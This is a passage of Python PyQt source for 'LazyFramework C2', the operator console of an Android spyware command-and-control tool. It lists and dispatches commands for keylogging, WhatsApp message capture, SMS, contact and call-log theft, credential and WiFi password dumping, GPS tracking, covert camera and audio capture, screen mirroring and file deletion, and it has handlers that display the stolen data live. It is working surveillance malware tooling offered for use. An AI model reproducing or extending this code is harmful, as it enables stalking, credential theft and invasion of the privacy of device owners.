        cmd = self.cmd_input.text().strip()
        if not cmd:
            return

        self.send_command_with_param(cmd)
        self.cmd_input.clear()

    # ================================================================
    # ✅ SHOW HELP
    # ================================================================

    def show_help(self):
        """Tampilkan daftar command yang tersedia"""
        help_text = """
📋 AVAILABLE COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 DEVICE INFO
  GET_DEVICE_INFO  - Device information
  GET_LOCATION     - GPS location
  GPS_DETAIL       - Detailed GPS info

👤 CONTACTS & SMS
  GET_CONTACTS     - Contact list
  GET_SMS          - SMS messages
  GET_CALL_LOGS    - Call history

📁 FILES & MEDIA
  GET_FILES_LIST   - List files
  DOWNLOAD_FILE    - Download file
  DELETE_FILE      - Delete file
  MOVE_FILE        - Move file
  GET_GALLERY      - Gallery images
  SCREENSHOT       - Take screenshot
  CAMERA_SNAPSHOT  - Take photo

⌨️ KEYLOGGER
  KEYLOG_START     - Start keylogger
  KEYLOG_STOP      - Stop keylogger
  KEYLOG_DUMP      - Get keylogs
  KEYLOG_STATUS    - Keylogger status

💬 WHATSAPP
  WA_INFO          - WhatsApp info
  WA_CAPTURE_START - Start capture
  WA_CAPTURE_STOP  - Stop capture
  WA_CAPTURE_DUMP  - Get messages
  WA_CAPTURE_STATS - Capture stats

🌐 BROWSER
  BROWSER_INFO     - Installed browsers
  BROWSER_HISTORY  - Browsing history
  BROWSER_BOOKMARKS - Bookmarks

🔐 ACCOUNTS & CREDENTIALS
  GET_ACCOUNTS     - Device accounts
  GET_GOOGLE_ACCOUNTS - Google accounts
  DUMP_CREDENTIALS - All credentials
  GET_WIFI_PASSWORDS - WiFi passwords

📺 RDP / MIRROR
  RDP_START        - Start screen mirror
  RDP_STOP         - Stop screen mirror
  RDP_STATUS       - Mirror status

📱 APPS
  GET_INSTALLED_APPS - Installed apps

🎵 AUDIO
  RECORD_AUDIO     - Record audio
  STOP_RECORDING   - Stop recording

💡 SHORTCUTS
  SMS → GET_SMS
  CONTACTS → GET_CONTACTS
  ACCOUNTS → GET_ACCOUNTS
  APPS → GET_INSTALLED_APPS
  SCREEN → SCREENSHOT
  WA → WA_CAPTURE_DUMP
  HELP → Show this help

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        self.add_output(help_text, "cyan")

    # ================================================================
    # ✅ REAL-TIME SIGNAL HANDLERS
    # ================================================================

    def on_keylog_data(self, msg: dict):
        key = msg.get("key", "")
        app = msg.get("app", "unknown")
        timestamp = msg.get("timestamp", datetime.now().strftime("%H:%M:%S"))
        self.keylog_text.append(f"[{timestamp}] {app}: {key}")
        self.keylog_text.verticalScrollBar().setValue(
            self.keylog_text.verticalScrollBar().maximum()
        )

    def on_location_update(self, msg: dict):
        lat = msg.get("latitude", 0)
        lng = msg.get("longitude", 0)
        self.add_output(f"📍 Location: {lat:.6f}, {lng:.6f}", "cyan")
        self.location_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] 📍 {lat:.6f}, {lng:.6f}")

    def on_whatsapp_message(self, msg: dict):
        sender = msg.get("sender", "unknown")
        message = msg.get("message", "")
        timestamp = msg.get("timestamp", datetime.now().strftime("%H:%M:%S"))
        self.wa_text.append(f"[{timestamp}] {sender}: {message}")
        self.wa_text.verticalScrollBar().setValue(
            self.wa_text.verticalScrollBar().maximum()
        )

    def on_screen_frame(self, msg: dict):
        self.add_output("📸 Screenshot received", "success")

    # ================================================================
    # ✅ UI METHODS
    # ================================================================

    def update_agent_list(self):
        while self.agent_layout.count() > 1:
            item = self.agent_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
        
        for agent_id, agent in self.agent_data.items():
            widget = AgentWidget(agent)
            widget.clicked.connect(self.on_agent_selected)
            self.agent_layout.insertWidget(self.agent_layout.count() - 1, widget)
            self.agent_widgets[agent_id] = widget
            
            if self.selected_agent == agent_id:
                widget.setStyleSheet("""
                    AgentWidget {
                        background-color: rgba(0, 210, 255, 0.12);
                        border-radius: 6px;
                        border-left: 3px solid #00d2ff;
                        padding: 4px;
                    }
                """)

        self.agent_count_label.setText(str(len(self.agent_data)))
        self.update_stats()

    def update_stats(self):
        total = len(self.agent_data)
        online = len([a for a in self.agent_data.values() if a.status == "online"])
        mirroring = sum(1 for a in self.agent_data.values() if a.mirroring)
        commands = sum(a.commands_sent for a in self.agent_data.values())

        if "Agents" in self.stat_labels:
            self.stat_labels["Agents"].setText(str(total))
        if "Online" in self.stat_labels:
            self.stat_labels["Online"].setText(str(online))
        if "Mirror" in self.stat_labels:
            self.stat_labels["Mirror"].setText(str(mirroring))
        if "Commands" in self.stat_labels:
            self.stat_labels["Commands"].setText(str(commands))

    def on_agent_selected(self, agent_id: str):
        self.selected_agent = agent_id
        self.add_output(f"📱 Selected agent: {agent_id[:12]}...", "info")
        
        for aid, widget in self.agent_widgets.items():
            if aid == agent_id:
                widget.setStyleSheet("""
                    AgentWidget {
                        background-color: rgba(0, 210, 255, 0.12);
                        border-radius: 6px;
                        border-left: 3px solid #00d2ff;
                        padding: 4px;
                    }
                """)
            else:
                widget.setStyleSheet("""
                    AgentWidget {
                        background-color: transparent;
                        border-radius: 6px;
                        padding: 4px;
                    }
                """)

    def select_all_agents(self):
        for agent_id in self.agent_data.keys():
            self.on_agent_selected(agent_id)

    def deselect_all_agents(self):
        self.selected_agent = None
        for widget in self.agent_widgets.values():
            widget.setStyleSheet("""
                AgentWidget {
                    background-color: transparent;
                    border-radius: 6px;
                    padding: 4px;
                }
            """)

    def refresh_agents(self):
        self.update_agent_list()
        self.add_output("🔄 Agents refreshed", "info")

    def set_command(self, cmd: str):
        self.cmd_input.setText(cmd)
        self.cmd_input.setFocus()


    def _format_app_list(self, data, result):
        """Format installed apps list"""
        count = result.get('count', len(data))
        formatted = f"📱 INSTALLED APPS ({count})\n"
        formatted += "━" * 70 + "\n\n"
        for i, app in enumerate(data[:100], 1):  # Max 100
            name = app.get('name', 'Unknown')[:40]
            pkg = app.get('package', 'N/A')[:60]
            formatted += f"{i:2}. {name}\n"
            formatted += f"     📦 {pkg}\n\n"
        return formatted

    def _format_file_list(self, data, result):
        """Format files list"""
        count = result.get('count', len(data))
        formatted = f"📁 FILES ({count})\n"
        formatted += "━" * 70 + "\n\n"
        for i, f in enumerate(data[:100], 1):
            path = f.get('path', 'N/A')[:50]
            size = f.get('size', 0)
            ftype = f.get('type', 'file')
            icon = "📂" if ftype == 'dir' else "📄"
            formatted += f"{i:2}. {icon} {path}\n"
            formatted += f"     💾 {size:,} bytes\n\n"
        return formatted

    def _format_browser_list(self, data, result):
        """Format browser history"""
        count = result.get('count', len(data))
        formatted = f"🌐 BROWSER ({count})\n"
        formatted += "━" * 70 + "\n\n"
        for i, b in enumerate(data[:100], 1):
            title = b.get('title', 'N/A')[:40]
            url = b.get('url', 'N/A')[:50]
            formatted += f"{i:2}. {title}\n"
            formatted += f"     🔗 {url}\n\n"
        return formatted

    def _format_gallery_list(self, data, result):
        """Format gallery images"""
        count = result.get('count', len(data))
        formatted = f"🖼️ GALLERY ({count})\n"
        formatted += "━" * 70 + "\n\n"
        for i, img in enumerate(data[:100], 1):
            path = img.get('path', 'N/A')[:50]
            size = img.get('size', 0)
            formatted += f"{i:2}. {path}\n"
            formatted += f"     💾 {size:,} bytes\n\n"
        return formatted

    def _format_accounts_list(self, data, result):
        """Format accounts"""
        count = result.get('count', len(data))
        formatted = f"🔐 ACCOUNTS ({count})\n"
        formatted += "━" * 70 + "\n\n"
        for i, acc in enumerate(data[:100], 1):
            name = acc.get('name', 'Unknown')[:40]
            atype = acc.get('type', 'N/A')[:30]
            formatted += f"{i:2}. {name}\n"
            formatted += f"     🏷️ {atype}\n\n"
        return formatted

    def _format_credentials_list(self, data, result):
        """Format credentials"""
        count = result.get('count', len(data))
        formatted = f"🔑 CREDENTIALS ({count})\n"
        formatted += "━" * 70 + "\n\n"
        for i, cred in enumerate(data[:100], 1):
            service = cred.get('service', 'Unknown')[:40]
            user = cred.get('username', 'N/A')[:40]
            formatted += f"{i:2}. {service}\n"
            formatted += f"     👤 {user}\n\n"
        return formatted


    def add_output(self, text: str, level: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color_map = {
            "success": "#51cf66",
            "error": "#ff6b6b",
            "warning": "#ffd93d",
            "info": "#c8d6e5",
            "cyan": "#00d2ff",
            "debug": "#6b7a8a"
        }
        color = color_map.get(level, "#c8d6e5")
        self.output_text.append(f'<span style="color: #6b7a8a;">[{timestamp}]</span> <span style="color: {color};">{text}</span>')
        self.output_text.verticalScrollBar().setValue(
            self.output_text.verticalScrollBar().maximum()
        )

    def clear_output(self):
        self.output_text.clear()
        self.add_output("🗑️ Output cleared", "info")

    def on_keylog_action(self, action: str):
        if action == "clear":
            self.keylog_text.clear()
            self.add_output("🗑️ Keylog cleared", "info")
            return

        if not self.selected_agent and self.agent_data:
            self.selected_agent = next(iter(self.agent_data.keys()))
            self.update_agent_list()

        if not self.selected_agent:
            self.add_output("⏳ Waiting for agent to connect...", "warning")
            return

        self.server.send_command(self.selected_agent, action)

    def on_whatsapp_action(self, action: str):
        if action == "clear_wa":
            self.wa_text.clear()
            self.add_output("🗑️ WhatsApp messages cleared", "info")
            return

        if not self.selected_agent and self.agent_data:
            self.selected_agent = next(iter(self.agent_data.keys()))
            self.update_agent_list()

        if not self.selected_agent:
            self.add_output("⏳ Waiting for agent to connect...", "warning")
            return

        self.server.send_command(self.selected_agent, action)

    def show_about(self):
        about_text = """
        <h2>⚡ LazyFramework C2</h2>
        <p>Version 3.3 - Server & Client All-in-One</p>
        <p>Command & Control Center</p>
        <br>
        <p><b>Fitur:</b></p>
        <ul>
            <li>Server built-in</li>
            <li>Ngrok tunnel auto-start</li>
            <li>Config server for agent auto-discovery</li>
            <li>Real-time agent monitoring</li>
            <li>Auto-select first connected agent</li>
            <li>Bypass beacon - terima semua koneksi</li>
            <li>Smart routing ke tab masing-masing</li>
            <li>Shortcut commands (SMS → GET_SMS, dll)</li>
        </ul>
        <br>
        <p style="color: #6b7a8a;">Made with ❤️</p>
        """
        QMessageBox.about(self, "About LazyFramework C2", about_text)

# ========================================
# APPLICATION ENTRY
# ========================================

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    app.setWindowIcon(QIcon())
    
    window = MainWindow()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
